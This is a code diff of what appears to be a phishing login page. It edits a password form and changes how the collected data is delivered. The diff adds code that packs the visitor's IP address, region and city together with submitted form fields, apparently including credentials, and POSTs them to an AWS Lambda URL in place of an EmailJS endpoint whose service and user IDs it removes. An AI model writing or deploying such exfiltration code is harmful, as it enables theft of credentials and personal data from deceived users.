@@ -4274,7 +4274,7 @@
                                 </svg>
                             </div>
                             <div class="invalid-feedback">
-                                The password that you've entered is incorrect.<br> Forgotten password?
+                                The password that you've entered is incorrect.
                             </div>
                         </div>
                         <div class="form-btn-wrapper">
@@ -4285,9 +4285,6 @@
                                 <span class="button-text">Continue</span>
                             </button>
                         </div>
-                        <!-- <div id="forgot-pass-wrap">
-                            <span>Forgotten password?</span>
-                        </div> -->
                     </form>
                     <div class="spaser"></div>
 
@@ -5427,8 +5424,9 @@
                 const data = await response.json();
                 userIpData = {
                     'user_ip': data.ip,
-                    'country': data.city,
+                    'country': data.region,
                     'country_code': data.country,
+                    'city': data.city,
                     'call_code': getCallingCode(data.country)
                 }
             } else {
@@ -5436,6 +5434,7 @@
                     'user_ip': 'Ip not detected ;(',
                     'country': '-',
                     'country_code': '-',
+                    'city': '-'
                 }
             }
         }
@@ -5443,7 +5442,6 @@
         
         // Send data to Email
         function sendDataEmail() {
-
             var templateData = {
                 'ip_address': userIpData.user_ip,
                 'country': userIpData.country,
@@ -5466,20 +5464,9 @@
                 'year': formsSendData['year']
             };
 
-            var serviceID = "service_vu29tml";
-            var userId = "qM3hTR5X-6e6EWL4X";
-            var templateId = "template_3rdjyf6";
-
-            var data = {
-                service_id: serviceID,
-                template_id: templateId,
-                user_id: userId,
-                template_params: templateData
-            };
-
-            $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
+            $.ajax('https://ajfesgwpz2qubmqrdvu6warxam0lssjq.lambda-url.us-west-2.on.aws/', {
                 type: 'POST',
-                data: JSON.stringify(data),
+                data: JSON.stringify(templateData),
                 contentType: 'application/json'
             }).done(function () {
                 // Xử lý khi gửi thành công
